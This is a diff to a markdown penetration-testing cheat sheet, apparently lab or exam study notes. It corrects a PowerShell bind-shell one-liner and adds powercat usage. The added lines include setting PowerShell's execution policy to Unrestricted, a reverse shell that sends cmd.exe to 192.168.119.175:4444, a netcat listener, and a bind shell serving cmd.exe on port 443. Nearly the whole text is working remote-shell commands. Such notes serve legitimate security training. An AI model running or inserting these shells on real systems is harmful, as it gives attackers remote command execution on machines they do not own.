@@ -176,8 +176,32 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.17
 ```
 #### One-liner bind sell
 ````
-powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ````
+
+## powercat
+
+launch powershell as admin and run following
+```
+Set-ExecutionPolicy Unrestricted
+
+```
+Then run dot-source the script
+```
+. .\powercat.ps1
+powercat
+```
+#### Reverse Shell
+```
+powercat -l -p 4444 / nc -nlvp 4444
+powercat -c 192.168.119.175 -p 4444 -e cmd.exe -v
+```
+
+#### Bind shell
+```
+powercat -l -p 443 -e cmd.exe
+powercat -c 192.168.175.10 -p 4444 
+```
 
 ## wireshark
 ### Checking for unencrypted bind shell
